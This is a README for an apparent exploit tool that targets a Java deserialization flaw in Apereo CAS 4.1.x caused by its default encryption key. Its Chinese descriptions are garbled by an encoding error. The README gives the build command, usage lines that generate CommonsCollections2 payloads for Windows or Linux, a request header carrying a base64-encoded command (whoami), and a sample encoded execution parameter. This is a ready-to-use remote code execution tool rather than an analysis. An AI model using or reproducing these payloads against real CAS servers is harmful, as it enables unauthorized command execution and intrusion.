# ApereoCAS 4.1.X ʹ��Ĭ����Կ���µķ����л�©�����Ը���

## 0x01 Introduce

1. Request/Response����
2. ֧��win��linux payload
2. ��ʹ��base64��ֹ�������

## 0x02 Buiding

```mvn clean package -DskipTests```

## 0x03 Usage

```
Usage: java -jar yso-apereoCAS-all.jar [payload] [platform]
Usage: java -jar yso-apereoCAS-all.jar CommonsCollections2_apereo "win"
Usage: java -jar yso-apereoCAS-all.jar CommonsCollections2_apereo "linux"

[Add Request Header] Reqstr: d2hvYW1p (whoami)

execution�����»��ߺ����Url encode key characters
3ce72aed-749b-4003-90a3-ea5ac52368fc_AAAAIgAAABByQvrQ..............
```

## 0x04 Screenshot
![Screenshot.png](./Screenshot.png)

## 0x05 Reference
* https://github.com/frohoff/ysoserial
* https://www.freebuf.com/vuls/226149.html
* https://www.00theway.org/2020/01/04/apereo-cas-rce/